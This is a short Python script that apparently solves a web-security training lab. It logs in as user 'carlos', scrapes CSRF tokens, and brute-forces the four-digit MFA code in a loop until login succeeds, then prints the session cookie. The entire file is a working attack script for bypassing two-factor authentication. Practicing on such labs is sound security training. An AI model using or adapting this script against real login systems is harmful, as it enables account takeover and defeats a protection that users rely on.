import requests
from bs4 import BeautifulSoup


url = "https://0ad500ad04df1e4e815f02bb0059000e.web-security-academy.net/"
creds = {"username":"carlos", "password":"montoya"}
codes = ["1234", "1537"]
s = requests.session()


def login():
    response = s.get(url+"login", allow_redirects=False)
    soup = BeautifulSoup(response.content, 'html.parser')
    csrf_token = soup.find('input', {'name' : 'csrf'})['value']
    creds["csrf"]=csrf_token
    return s.post(url+"login", data=creds)

def try_code(c):
    response = s.get(url+"login2", allow_redirects=False)
    soup = BeautifulSoup(response.content, 'html.parser')
    csrf_token = soup.find('input', {'name' : 'csrf'})['value']
    data = {"mfa-code":str(c).rjust(4, '0'), 'csrf':csrf_token}
    return s.post(url+"login2", data=data)

i=100
while(True):
    login() 
    r = try_code(i)
    print(i%1000)
    print(r.text)
    if("Incorrect" not in r.text):
        print("Logged in")
        print(i)
        print(s.cookies["session"])
        exit(0)

    i=(i+1)

